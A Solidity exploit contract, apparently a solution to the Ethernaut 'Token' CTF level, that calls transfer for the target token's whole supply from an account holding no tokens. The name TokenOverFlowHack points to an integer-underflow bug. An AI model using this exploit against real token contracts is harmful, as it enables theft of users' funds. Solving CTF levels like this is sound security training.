// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

/**
 * @title IToken
 * @dev Interface for the Token contract from the Ethernaut CTF challenge
 */

interface IToken {
    /**
     * @dev Transfers tokens from the caller to the recipient
     * @param _to The recipient of the tokens
     * @param _value The amount of tokens to transfer
     * @return bool Whether the transfer was successful
     */
    function transfer(address _to, uint256 _value) external returns (bool);

    /**
     * @dev Returns the total supply of tokens
     * @return uint256 The total supply of tokens
     */
    function totalSupply() external view returns (uint256);
}

contract TokenOverFlowHack {

    /// @notice Reference to the target Token contract
    IToken public token;
    
    /// @notice Address of the target Token contract
    address public tokenAddress;
    
    /**
     * @dev Constructor sets the address of the Token contract to attack
     * @param _tokenAddress The address of the deployed Token contract
     */
    constructor(address _tokenAddress) public {
        tokenAddress = _tokenAddress;
        token = IToken(tokenAddress);
    }


    /**
     * @dev Claims the total supply of tokens by transferring them to the owner
     * @param _owner The address to which the tokens will be transferred
     */
    function getToken(address _owner) public {
        uint256 supply = token.totalSupply();
        token.transfer(_owner, supply);
    }
}
